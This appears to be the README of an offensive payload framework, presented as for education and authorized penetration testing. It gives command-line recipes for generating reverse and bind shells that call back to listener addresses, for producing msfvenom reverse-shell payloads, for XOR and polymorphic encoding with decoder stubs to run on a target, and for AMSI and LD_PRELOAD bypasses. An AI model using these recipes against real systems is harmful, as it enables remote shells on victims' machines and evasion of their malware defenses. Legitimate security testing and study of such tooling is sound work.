# Advanced Payload Obfuscation Framework

A payload encoding and obfuscation framework for educational purposes and authorized penetration testing.

## Features

- **5 Encoding Algorithms**: Base64, XOR, ROT13, Caesar Cipher, Polymorphic
- **Multiple Input Formats**: Binary files, hex strings, C# arrays, raw data
- **Payload Generation**: Linux/Windows reverse/bind shells
- **Automatic Decoders**: Generated Python decoders with execution capability
- **OS-Specific Bypasses**: AMSI (Windows) and LD_PRELOAD (Linux)

## Installation

```bash
git clone <repository-url>
cd advanced_payload_framework
chmod +x setup.sh
./setup.sh
```

## Quick Start

### Prepare Your Payloads
First, place your payload files in the `sample_payloads/` directory:
```bash
# Example: Create a simple command payload
echo "whoami && id" > sample_payloads/my_payload.txt

# Or copy your existing payload
cp your_payload.bin sample_payloads/
```

### Interactive Menu
```bash
./start.sh
```

### Command Line Usage

#### Basic Framework
```bash
# Simple obfuscation
python3 main.py --file sample_payloads/basic.txt --chain stealth --variants 3

# OS-specific with bypasses
python3 main.py --file sample_payloads/basic.txt --chain full --target linux --variants 5
```

#### Payload Generator
```bash
# Generate reverse shell
python3 payload_gen.py -t python_reverse --host 192.168.1.100 -p 4444 -o shell.py -f python

# Generate Linux shellcode
python3 payload_gen.py -t linux_reverse --host 10.0.0.1 -p 443 -o shell.bin
```

#### Advanced Encoder
```bash
# XOR encoding with decoder
python3 encoder.py -i payload.bin -o encoded.txt -e xor --key 0xAA --decoder

# Base64 encoding
python3 encoder.py -i shellcode.hex -f hex -e base64 --iterations 3 -o encoded.txt

# Polymorphic encoding
python3 encoder.py -i payload.bin -e polymorphic -o encoded.txt --decoder
```

## File Structure

```
advanced_payload_framework/
├── main.py                 # Main obfuscation framework
├── start.sh               # Interactive menu
├── encoder.py             # Advanced payload encoder
├── payload_gen.py         # Payload generator
├── decoder.py             # Payload decoder utility
├── encoders/              # Encoding modules
├── obfuscators/           # Obfuscation modules  
├── bypasses/              # OS bypass modules
├── sample_payloads/       # Test payloads (PUT YOUR PAYLOADS HERE)
├── libhook.so            # Compiled hook library
├── test_framework.py     # Unit tests
└── demo_pipeline.sh      # Demo workflow
```

## Usage Examples

### 1. Basic Obfuscation
```bash
# Put your payload in sample_payloads folder first
echo "whoami" > sample_payloads/test_payload.txt

# Obfuscate with stealth chain
python3 main.py --file sample_payloads/test_payload.txt --chain stealth --variants 3

# Save result
python3 main.py --file sample_payloads/test_payload.txt --chain stealth --variants 1 > obfuscated.txt
```

### 2. Generate and Encode Shellcode
```bash
# Generate Python reverse shell
python3 payload_gen.py -t python_reverse --host 192.168.1.100 -p 4444 -o shell.py -f python

# Encode with XOR
python3 encoder.py -i shell.py -e xor --key "secret" -o encoded_shell.txt --decoder

# Execute decoder (on target)
python3 encoded_shell_decoder.py
```

### 3. Metasploit Integration
```bash
# Generate msfvenom payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f csharp > msf_payload.cs

# Encode with framework
python3 encoder.py -i msf_payload.cs -f csharp -e polymorphic -o encoded.txt --decoder
```

### 4. OS-Specific Bypasses
```bash
# Linux with LD_PRELOAD bypass
python3 main.py --file sample_payloads/basic.txt --chain full --target linux

# Windows with AMSI bypass  
python3 main.py --file sample_payloads/basic.txt --chain full --target windows
```

## Command Reference

### main.py Options
- `--file` - Input payload file
- `--payload` - Direct payload string
- `--chain` - Obfuscation chain: basic/stealth/full
- `--target` - Target OS: windows/linux/both
- `--variants` - Number of variants to generate
- `--verbose` - Show detailed processing steps
- `--output` - Save results to JSON file

### encoder.py Options
- `-i, --input` - Input payload file
- `-o, --output` - Output encoded file
- `-e, --encoder` - Encoding algorithm: base64/xor/rot13/polymorphic/caesar
- `-f, --format` - Input format: raw/hex/csharp/binary
- `--key` - Encoding key (for XOR)
- `--decoder` - Generate decoder stub
- `--output-format` - Output format: hex/csharp/python/base64

### payload_gen.py Options
- `-t, --type` - Payload type: linux_reverse/linux_bind/windows_reverse/windows_bind/python_reverse/python_bind
- `--host` - LHOST for reverse shells
- `-p, --port` - Port number
- `-o, --output` - Output filename
- `-f, --format` - Output format: binary/hex/csharp/python

## Testing

```bash
# Run unit tests
python3 test_framework.py

# Run demo pipeline
bash demo_pipeline.sh

# Test decoder
python3 decoder.py encoded_payload.txt
```

## Legal Disclaimer

This framework is for:
- **Educational purposes only**
- **Authorized penetration testing**
- **Security research with permission**

**NOT for:**
- Unauthorized system access
- Malicious activities
- Illegal penetration testing

## Contributing

1. Fork the repository
2. Create your feature branch
3. Make your changes
4. Test your changes
5. Submit a pull request

## License

MIT License - see LICENSE file for details.